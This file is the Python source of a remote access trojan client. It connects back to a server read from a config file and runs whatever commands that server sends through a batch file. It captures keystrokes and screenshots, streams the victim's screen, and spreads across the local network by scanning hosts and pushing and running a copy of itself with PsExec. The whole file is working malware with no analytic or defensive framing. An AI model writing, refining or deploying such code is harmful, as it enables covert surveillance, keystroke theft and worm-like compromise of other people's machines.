import socket
import subprocess
from pynput.keyboard import Key, Listener
import logging
import os
import threading
import re
from PIL import ImageGrab, Image
import mss
import io
import sys
import signal
import ipaddress
import time

# Read server IP and port from IPPORT.txt
with open("IPPORT.txt", "r") as f:
    SERVER_IPV6 = f.readline().strip()
    SERVER_IPV4 = f.readline().strip()
    PORT = int(f.readline().strip())

#defining configuration
logging.basicConfig(filename=("t.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#define: create listener event on keypress and write to log file
def on_press(key):
    logging.info(str(key))
    with open("t.txt", "r") as fileee:
        data = fileee.read().encode()
    with open("t.txt", "w") as fileee:
        fileee.write('')
    s.send(data)

def run_command(command):
    result = subprocess.run(command, capture_output=True, text=True)
    with open("command_output.txt", "w") as f:
        f.write(result.stdout)

quit = 0

keylogging = threading.Event()
stop_keylogging = threading.Event()

def START():
    while not stop_keylogging.is_set():
        while keylogging.is_set():
            with Listener(on_press=on_press) as listener:
                listener.join() #join main thread after listening

def kill_client():
    os.kill(os.getpid(), signal.SIGTERM)

def list_network_computers():
    reachable_computers = []
    local_ip = socket.gethostbyname(socket.gethostname())
    ip_network = ipaddress.ip_network(local_ip + '/24', strict=False)
    
    start_time = time.time()
    for ip in ip_network.hosts():
        if time.time() - start_time > 10:
            break
        ip = str(ip)
        response = os.system(f"ping -n 1 -w 1 {ip} >nul")
        if response == 0:
            reachable_computers.append(ip)
    
    return reachable_computers

def check_and_install_psexec():
    try:
        result = subprocess.run(['psexec'], capture_output=True, text=True)
        if 'PsExec' in result.stdout:
            return True
    except FileNotFoundError:
        pass

    try:
        # Download and install PsExec
        subprocess.run(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PSTools.zip"'], check=True)
        subprocess.run(['powershell', '-Command', 'Expand-Archive -Path "PSTools.zip" -DestinationPath "."'], check=True)
        os.environ["PATH"] += os.pathsep + os.path.abspath("PSTools")
        return True
    except Exception as e:
        print(f"Failed to install PsExec: {e}")
        return False

def spread_to_computer(computer):
    try:
        # Copy testrat.exe to the remote computer
        subprocess.run(f'psexec \\\\{computer} -s -c testrat.exe', shell=True, check=True)
        # Copy IPPORT.txt to the remote computer
        subprocess.run(f'psexec \\\\{computer} -s -c IPPORT.txt', shell=True, check=True)
        # Execute testrat.exe on the remote computer
        subprocess.run(f'psexec \\\\{computer} -s -d C:\\Windows\\Temp\\testrat.exe', shell=True, check=True)
        return True
    except Exception as e:
        print(f"Failed to spread to {computer}: {e}")
        return False

def connect_to_server():
    global s
    try:
        # Try IPv6 connection
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.connect((SERVER_IPV6, PORT, 0, 0))
    except:
        # Fallback to IPv4 connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IPV4, PORT))

# Ensure PsExec is installed on the client machine

while (quit == 0):

    #Try connecting without exiting with an error, until it is connected to the server.
    #heh, incase they disconnect after being connected to sigma server
    while True:
        try:
            connect_to_server()
            msg = s.recv(1024).decode()
            print('[*] server:', msg)
        except:
            s.close()
            continue
        break
    try:
        while (quit == 0):
            TR = s.recv(1024).decode()
            transferToBat = re.sub(r';', '\n', TR)
            with open("vbucks.bat", "w") as file:
                file.write(transferToBat)
            print(f'[+] received command: {transferToBat}')

            #quit custom command
            if transferToBat in ['q', 'quit', 'x', 'exit']:
                quit = 1

            #kill client custom command
            if transferToBat == 'kill':
                kill_client()

            #keylogger custom command
            #starts keylogging and sends to server
            if transferToBat == 'k1':
                if keylogging.is_set():
                    result = '[*] keylogger already on'.encode()
                    s.send(result)
                else:
                    result = '[*] keylogger enabled'.encode()
                    s.send(result)
                    keylogging.set()
                    keylogging_thread = threading.Thread(target=START)
                    keylogging_thread.start()
            elif transferToBat == 'k0':
                if not keylogging.is_set():
                    result = '[*] keylogger already off'.encode()
                    s.send(result)
                else:
                    result = '[*] keylogger disabled'.encode()
                    s.send(result)
                    keylogging.clear()
                    stop_keylogging.set()

            # Screenshot command
            elif transferToBat == 'screenshot':
                try:
                    screenshot = ImageGrab.grab()
                    screenshot.save("screenshot.png")
                    with open("screenshot.png", 'rb') as f:
                        file_data = f.read()
                    file_info = f"screenshot.png|{len(file_data)}"
                    s.send(file_info.encode())
                    s.sendall(file_data)
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode())

            # Stream command
            elif transferToBat == 'stream':
                try:
                    with mss.mss() as sct:
                        while True:
                            screenshot = sct.grab(sct.monitors[1])
                            img = Image.frombytes('RGB', (screenshot.width, screenshot.height), screenshot.rgb)
                            with io.BytesIO() as output:
                                img.save(output, format="JPEG")
                                stringData = output.getvalue()
                            s.send(str(len(stringData)).ljust(16).encode())
                            s.sendall(stringData)
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode())

            # Spread to network command
            elif transferToBat == 'spread':
                computers = list_network_computers()
                if computers:
                    computer_list = "\n".join(computers)
                    s.send(f"Available computers:\n{computer_list}\nSelect a computer to spread to:".encode())
                    selected_computer = s.recv(1024).decode().strip()
                    if selected_computer in computers:
                        if spread_to_computer(selected_computer):
                            s.send(f"Spread to {selected_computer} successfully.".encode())
                        else:
                            s.send(f"Failed to spread to {selected_computer}.".encode())
                    else:
                        s.send("Invalid computer selection.".encode())
                else:
                    s.send("No available computers to spread to.".encode())

            # Spread to a specific IP command
            elif transferToBat == 'spread_manual':
                s.send("Enter the IPv4 address to spread to:".encode())
                selected_computer = s.recv(1024).decode().strip()
                if spread_to_computer(selected_computer):
                    s.send(f"Spread to {selected_computer} successfully.".encode())
                else:
                    s.send(f"Failed to spread to {selected_computer}.".encode())

            try:
                result = subprocess.check_output("vbucks.bat", text=True)
                s.send(result.encode())
                with open("vbucks.bat", "w") as file:
                    file.write('')  # Clear the contents of vbucks.bat after execution
            except Exception as e:
                s.send(f"Error: {str(e)}".encode())
            
    except UnicodeDecodeError:
        pass
    except Exception as F:
        print(str(F))
        print("[-] Server: disconnected")
        s.close()
        
s.close()